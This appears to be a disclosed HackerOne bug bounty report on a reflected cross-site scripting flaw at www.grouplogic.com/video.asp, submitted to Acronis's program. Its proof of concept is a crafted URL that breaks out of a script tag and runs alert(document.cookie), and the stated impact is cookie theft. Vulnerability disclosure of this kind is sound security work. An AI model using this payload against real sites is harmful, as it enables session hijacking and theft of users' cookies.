# Reflected XSS on www.grouplogic.com/video.asp

## Report Details
- **Report ID**: 859802
- **URL**: https://hackerone.com/reports/859802
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-04-26T17:29:49.056Z
- **Disclosed**: 2021-04-13T13:23:49.531Z

## Reporter
- **Username**: ali
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Hello there,
I hope you are well!

PoC:
http://www.grouplogic.com/video.asp?v=Acroxx1%22%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Es_aE&e=mp4&width=560&height=315

## Impact

Stealing cookies

Best Regards,
@mygf

## Attachments
No attachments
